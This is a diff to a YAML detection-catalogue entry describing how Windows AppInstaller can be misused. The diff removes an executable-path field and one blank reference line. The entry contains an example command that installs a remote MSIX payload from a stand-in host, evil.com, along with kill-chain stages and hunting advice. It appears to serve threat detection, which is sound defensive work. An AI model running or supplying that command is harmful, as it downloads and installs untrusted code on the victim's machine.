@@ -1,7 +1,5 @@
 - command: start ms-appinstaller://?source=https://evil.com/raw/payload
   description: Launch AppInstaller.exe to install a remote AppX/MSIX payload on Windows 10.  The package will be saved in a location such as C:\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\AC\INetCache\<RANDOM-8-CHAR-DIRECTORY>.
-  executable:
-    - C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_*\AppInstaller.exe
   killchain:
     - Installation
     - Actions on Objectives
@@ -12,7 +10,6 @@
     - Windows
   references:
     - https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/
-    -
   risk: Medium
   risk_reason: Users are not typically executing this command manually - hunting for suspicious URLS in the commandline should help to identify high-risk transactions.
   fidelity: Low
